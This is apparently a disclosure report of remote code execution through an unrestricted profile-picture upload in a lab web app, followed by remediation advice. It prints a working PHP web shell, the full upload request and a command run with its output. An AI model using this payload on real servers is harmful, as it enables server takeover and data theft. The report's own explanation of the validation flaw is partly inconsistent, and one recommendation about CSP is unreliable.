# Remote Code Execution (RCE) via Unrestricted File Upload

## Summary

I identified a Remote Code Execution (RCE) vulnerability in the profile picture upload functionality of the PixelEet application.

The application accepts file uploads through the "Profile Picture" feature without proper validation of the file type or content. By uploading a PHP file containing malicious code, an attacker can execute arbitrary commands on the server. The uploaded file is stored in a publicly accessible directory (`/subdomains/pixelet/uploads/`), allowing direct access and execution.

An attacker can upload a web shell disguised as an image file, then access it through the browser to execute system commands, read sensitive files, or fully compromise the server.

## Vulnerability Type

**Remote Code Execution (RCE) / Unrestricted File Upload**

## Vulnerable Parameter

```text
avatar (file upload field)
```

## Vulnerable URL

```text
https://kzlabs.in/subdomains/pixelet/index.php?action=upload
```

## Steps to Reproduce

1. Navigate to the PixelEet application profile page at `https://kzlabs.in/subdomains/pixelet/index.php?action=upload`.

2. Click the **Choose File** button under "Profile Picture".

3. Select a PHP file (e.g., `rce.php`) containing the following payload:

   ```php
   <?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
   ```

4. Click the **Upload** button.

5. Observe that the application accepts the PHP file despite only allowing JPG, PNG, and GIF extensions.

6. The file is uploaded to the server and the application displays "Profile picture updated."

7. Access the uploaded file directly:

   ```text
   https://kzlabs.in/subdomains/pixelet/uploads/rce.php?cmd=whoami
   ```

8. Observe that the server executes the command and returns the current user (`daemon`).

## Payload Used

```php
<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```

URL-encoded version:
```text
%3C%3Fphp%20if%20(isset(%24_GET%5B%27cmd%27%5D))%20%7B%20system(%24_GET%5B%27cmd%27%5D)%3B%20%7D%20%3F%3E
```

## Proof of Concept

The vulnerability exists because the application only checks the file extension, not the file content or MIME type. Additionally, the application allows `.php` files to be uploaded despite claiming to only accept image formats.

The uploaded PHP file is stored in a publicly accessible directory, allowing direct execution:

```http
POST /subdomains/pixelet/index.php?action=upload HTTP/2
Host: kzlabs.in
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRGEBicd8Q7RC5GyQM

------WebKitFormBoundaryRGEBicd8Q7RC5GyQM
Content-Disposition: form-data; name="avatar"; filename="rce.php"
Content-Type: application/octet-stream

<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
------WebKitFormBoundaryRGEBicd8Q7RC5GyQM--
```

After uploading, accessing the file executes the command:

```http
GET /subdomains/pixelet/uploads/rce.php?cmd=whoami HTTP/2
Host: kzlabs.in
```

Response:
```
daemon
```

This confirms that arbitrary command execution is possible on the server.

## Impact

An attacker can:

- Execute arbitrary system commands on the server
- Read, write, and delete sensitive files
- Compromise the entire web server
- Pivot to internal networks
- Install backdoors and malware
- Steal sensitive data (database credentials, user data)
- Deface the website
- Use the server for further attacks (DDoS, spam, cryptomining)

## Recommendation

To mitigate this vulnerability:

- **File Type Validation**: Validate file types using content inspection, not just extensions.
  ```php
  $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
  $finfo = finfo_open(FILEINFO_MIME_TYPE);
  $mime = finfo_file($finfo, $_FILES['avatar']['tmp_name']);
  if (!in_array($mime, $allowed_types)) {
      die("Invalid file type.");
  }
  ```

- **File Extension Validation**: Use a whitelist of allowed extensions.
  ```php
  $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
  $ext = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
  if (!in_array($ext, $allowed_ext)) {
      die("Invalid file extension.");
  }
  ```

- **Rename Uploaded Files**: Generate random filenames to prevent direct access and execution.
  ```php
  $new_filename = bin2hex(random_bytes(16)) . '.' . $ext;
  move_uploaded_file($_FILES['avatar']['tmp_name'], $upload_dir . $new_filename);
  ```

- **Disable PHP Execution**: Configure the upload directory to not execute PHP files.
  ```apache
  <Directory "/uploads">
      php_flag engine off
  </Directory>
  ```

- **Store Files Outside Webroot**: Store uploaded files outside the web-accessible directory.

- **Use a CDN**: Serve uploaded files from a CDN or separate domain.

- **Content Security Policy (CSP)**: Implement a strict CSP to restrict file execution.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block malicious uploads.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.
